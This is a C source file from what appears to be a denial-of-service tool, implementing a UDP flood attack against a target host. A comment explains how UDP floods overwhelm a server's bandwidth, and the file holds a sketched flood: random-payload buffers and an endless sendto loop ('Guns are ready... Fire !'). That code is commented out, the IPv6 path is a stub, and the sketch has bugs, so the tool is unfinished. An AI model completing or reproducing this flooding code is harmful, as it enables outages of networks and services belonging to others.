// Copyright [2016] [hoenir]
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//    http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

#include <stdio.h>
#include <string.h>

#include <lib/conn.h>
#include <lib/info.h>
#include <lib/mem.h>
#include <lib/util.h>

#include "udp_flood.h"

#define PK_SIZE 256

// udp_err_t type to retain errors from udp package
typedef int udp_err_t;

typedef struct udp_atk {
	// depending on the args it will generate a proc_cb
	// that will pe used to launch the attack.
	void (*proc_cb)(void *);
} udp_atk;

static void udp_setup4(conn4_t *conn, const char *host)
{
	if (!conn)
		INFOEE("Empty ipv4 conn pointer, please pass a non null conn");

	if (!host) 
		INFOEE("Empty host, cand set up the udp conn");

    /*  */
	/* (void)host; */
	/* uint16_t port = port_random(); */
    /*  */
	/* conn->addr->sin_family		= AF_INET; */
	/* conn->addr->sin_port		= htons(port); */
	/* conn->addr->sin_addr.s_addr = htonl(INADDR_ANY); */
	/* memset(&conn->addr->sin_addr, 0,sizeof(conn->addr->sin_addr)); */
    /*  */
	/* conn->sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP); */
	/* if (!conn->sock) */
	/* 	INFOEE("Could not create the upd socket"); */
    /*  */
	/* if (!bind(conn->sock, (SA *)&conn->addr, sizeof(conn->addr))) */
	/* 	INFOEE("Could not bind the udp socket"); */
    /*  */
	/* conn->buff = xzmalloc(PK_SIZE * sizeof(conn->buff)); */
	/* for (int i = 0; i < PK_SIZE; i++) */
	/* 	// fill up the buffer with random data. */
	/* 	urandom_bytes(&conn->buff[i], sizeof(conn->buff[i])); */
}
/*  */
/* static void udp_attack4(void *conn) */
/* { */
/* 	conn4_t *c = conn; */
/* 	ssize_t n; */
/*  */
/* 	INFO("Guns are ready... Fire !"); */
/* 	for (;;) { */
/* 		n = sendto(c->sock, c->buff, PK_SIZE * sizeof(unsigned char), 0, */
/* 				   (SA *)&c->addr, sizeof(c)); */
/* 		if (!n) { */
/* 			WSTATUS("Could not send udp packet ..."); */
/* 			break; */
/* 		} */
/* 	} */
/* } */
/*  */
/* static void udp_setup_attack(udp_atk *atk) */
/* { */
/* 	(void)atk; */
/* 	(void)udp_attack4; */
/* 	//atk->proc_cb = udp_attack4; */
/* } */
/*  */
/*
 * Udp flood
 *
 * User Datagram Protocol(UDP) is a connectionless
 * protocol that uses datagrams embeddded in IP packets for
 * communication without needing to create a session between two devices
 * (and therefore requiring no handshake process). A UDP Flood attack
 * does not exploit a specific vulnerability, but rather simply abuses 
 * normal behaviour at a high enough level to cause network
 * congestion for a targeted network. It consists of sending a large number
 * of UDP datagrams from petentially spoofed IP addresses to random
 * ports on a target server; the server reciving this traffic is unable
 * to process every request, and consumes all of it's bandwidth
 * attempting to send ICMP "destination unreachable" packet replies to
 * confirm that there was no application listening on the target ports.
 * As a volumetric attack, a UDP flood is measured in Mbps(bandwidth)
 * and PPS(packets per second).
 *
 * udp_flood
 *
 * this is the entry function where the args will pe parsed
 * and start the attack.
 *
 */
void udp_flood(arguments args)
{
	STATUS("UDP-FLOOD attack is starting.");
	// if random flag is set just alert user
	// that the UDP Flood already uses random port option
	// due to the nature of the attack
	if (args.port.random)
		STATUS("UDP-FLOOD already uses the random flag.");

	conn_t *conn = NULL;
	udp_atk atk;
	memset(&atk, 0, sizeof(atk));
	conn = conn_new(args.host_type);
	switch (args.host_type) {
	case IPV4:
		STATUS("UDP-FLOOD is using IPV4");
		udp_setup4(conn->c4, args.host);
		//udp_setup_attack(&atk);
		//atk.proc_cb(conn->c4);
		break;
	case IPV6:
		//TODO
		break;
	}

	///TODO
	conn_free(conn, args.host_type);
}
